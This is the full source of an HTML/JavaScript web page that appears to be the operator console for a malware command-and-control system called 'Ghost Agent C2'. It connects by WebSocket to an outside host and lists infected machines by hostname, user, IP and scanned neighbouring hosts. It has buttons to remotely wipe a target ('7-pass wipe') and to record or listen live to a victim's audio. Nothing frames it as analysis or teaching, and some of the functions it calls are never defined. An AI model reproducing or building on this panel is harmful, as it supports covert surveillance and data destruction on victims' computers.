<!DOCTYPE html>
<html>
<head>
    <title>Ghost C2 Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #fff; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .target-card { background: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #ff6b35; }
        .online { border-left-color: #00ff88; }
        .target-header { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; margin: 5px; }
        .destroy-btn { background: #ff4444; color: white; }
        .record-btn { background: #ff6b35; color: white; }
        .live-btn { background: #00ff88; color: #000; }
        .log { background: #000; height: 200px; overflow-y: auto; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 12px; white-space: pre; }
        .network-list { font-size: 11px; max-height: 100px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>👻 Ghost Agent C2</h1>
        <div id="log" class="log">C2 Server Online...</div>
        
        <h2>Active Targets</h2>
        <div id="targets" class="target-grid"></div>
        
        <div style="margin-top: 30px;">
            <h2>Controls</h2>
            <button id="refresh" onclick="refreshTargets()">🔄 Refresh</button>
        </div>
    </div>

    <script>
        const ws = new WebSocket('wss://beans348r59325.com:8080');
        const targets = {};
        const logEl = document.getElementById('log');
        
        ws.onopen = () => log('C2 Connected');
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            handleMessage(data);
        };
        
        function handleMessage(data) {
            if (data.agent_id) {
                if (!targets[data.agent_id]) targets[data.agent_id] = {};
                targets[data.agent_id] = {...targets[data.agent_id], ...data};
                updateDashboard();
            }
            
            logEvent(JSON.stringify(data, null, 2));
        }
        
        function updateDashboard() {
            const grid = document.getElementById('targets');
            grid.innerHTML = '';
            
            Object.entries(targets).forEach(([id, data]) => {
                const card = document.createElement('div');
                card.className = `target-card online`;
                card.innerHTML = `
                    <div class="target-header">${data.hostname || id} (${data.username})</div>
                    <div>IP: ${data.local_ip || 'Scanning...'}</div>
                    <div>Status: ${Date.now() - (data.timestamp * 1000) < 60000 ? '🟢 LIVE' : '🟡 STALE'}</div>
                    <div>Network: ${data.arp_hosts?.length || 0} hosts</div>
                    <div class="network-list">${data.arp_hosts?.slice(0,10).join(', ') || ''}</div>
                    <br>
                    <button class="destroy-btn" onclick="destroyTarget('${id}')">💥 DESTROY AGENT</button>
                    <button class="record-btn" onclick="toggleRecord('${id}')">🎙️ Record</button>
                    <button class="live-btn" onclick="liveListen('${id}')">🔊 Live</button>
                `;
                grid.appendChild(card);
            });
        }
        
        function destroyTarget(id) {
            if (confirm(`NUKE ${id}? This is PERMANENT (7-pass wipe)`)) {
                fetch('/destroy', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: id})
                });
                logEvent(`🚀 DESTROY sent to ${id}`);
            }
        }
        
        function logEvent(msg) {
            logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            logEl.scrollTop = logEl.scrollHeight;
        }
        
        function refreshTargets() {
            updateDashboard();
        }
        
        setInterval(refreshTargets, 5000);
        updateDashboard();
    </script>
</body>
</html>
